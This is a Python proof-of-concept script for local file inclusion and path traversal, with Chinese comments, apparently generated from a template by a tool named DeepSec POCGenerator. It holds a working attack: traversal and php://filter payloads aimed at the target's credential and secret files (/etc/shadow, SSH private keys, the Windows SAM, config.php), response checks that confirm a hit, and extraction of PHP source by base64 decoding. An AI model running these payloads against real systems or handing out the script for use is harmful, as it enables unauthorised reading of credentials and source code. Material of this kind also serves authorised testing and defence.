#!/usr/bin/env python3
"""
文件包含 / 路径遍历 POC
自动生成 by DeepSec POCGenerator
漏洞类型: {{ vuln_type }}
目标: {{ target_url }}
参数: {{ parameter }}
"""
import requests
import sys
import urllib.parse

TARGET = "{{ target_url }}"
PARAMETER = "{{ parameter }}"
PAYLOAD = "{{ payload }}"
METHOD = "{{ method }}"
COOKIE = "{{ cookie }}"

# --- 敏感文件列表 ---
SENSITIVE_FILES_UNIX = [
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hosts",
    "/etc/group",
    "/proc/self/environ",
    "/proc/version",
    "/var/log/apache2/access.log",
    "/var/log/auth.log",
    "/home/.*//.ssh/id_rsa",
    "/var/www/html/.htaccess",
    "/var/www/html/config.php",
]

SENSITIVE_FILES_WIN = [
    "C:\\Windows\\win.ini",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "C:\\Windows\\System32\\config\\SAM",
    "C:\\inetpub\\wwwroot\\web.config",
    "C:\\Users\\Administrator\\NTUSER.DAT",
]

# --- 路径遍历 payload ---
TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "../../../../../../etc/passwd",
    "../../../../../../../etc/passwd",
    "../../../../../../../../etc/passwd",
    "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "....//....//....//etc/passwd",
    "/etc/passwd",
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "php://filter/convert.base64-encode/resource=index.php",
    "file:///etc/passwd",
    "data://text/plain;base64,dGVzdA==",
]


def send_payload(payload):
    """发送 LFI payload 并返回响应。"""
    params = {PARAMETER: payload}
    headers = {"Cookie": COOKIE} if COOKIE else {}

    if METHOD.upper() == "POST":
        resp = requests.post(TARGET, data=params, headers=headers, timeout=10)
    else:
        resp = requests.get(TARGET, params=params, headers=headers, timeout=10)

    return {
        "status": resp.status_code,
        "length": len(resp.text),
        "text": resp.text,
    }


def check_lfi():
    """检测 LFI 漏洞。"""
    indicators = [
        "root:x:0:0:",           # /etc/passwd
        "[boot loader]",          # win.ini
        "127.0.0.1",              # hosts 文件
        "[extensions]",           # win.ini
        "daemon:",                # /etc/passwd
        "bin:",                   # /etc/passwd
        "nobody:",                # /etc/passwd
    ]

    for payload in TRAVERSAL_PAYLOADS:
        resp = send_payload(payload)
        if resp["status"] == 200:
            for indicator in indicators:
                if indicator in resp["text"]:
                    print(f"[+] LFI 确认: payload={payload}")
                    print(f"[+] 内容片段: {resp['text'][:200]}")
                    return True, payload, resp["text"]
    return False, "", ""


def read_file(file_path):
    """通过 LFI 读取指定文件。"""
    # TODO: 构造路径遍历 payload
    payload = f"../../../../../../{file_path}"
    resp = send_payload(payload)
    if resp["status"] == 200:
        return resp["text"]
    return None


def extract_php_source():
    """通过 php://filter 提取 PHP 源码。"""
    payloads = [
        "php://filter/convert.base64-encode/resource=index.php",
        "php://filter/convert.base64-encode/resource=config.php",
        "php://filter/convert.base64-encode/resource=../config.php",
    ]

    for payload in payloads:
        resp = send_payload(payload)
        if resp["status"] == 200 and len(resp["text"]) > 0:
            import base64
            try:
                decoded = base64.b64decode(resp["text"].strip())
                print(f"[+] PHP 源码提取成功: {payload}")
                print(f"[+] 内容: {decoded.decode('utf-8', errors='replace')[:500]}")
                return decoded.decode('utf-8', errors='replace')
            except Exception:
                pass
    return None


if __name__ == "__main__":
    print(f"[*] LFI POC - {TARGET} param={PARAMETER}")
    print(f"[*] 检测中...")

    found, payload, content = check_lfi()

    if found:
        print(f"\n[+] LFI 漏洞确认 @ {TARGET}")
        print(f"[+] 参数: {PARAMETER}")
        print(f"[+] 有效 payload: {payload}")
        print(f"[+] 文件内容: {content[:200]}")

        # 尝试提取 PHP 源码
        source = extract_php_source()
        if source:
            print(f"[+] PHP 源码提取成功")
    else:
        print("[-] 未检测到 LFI")
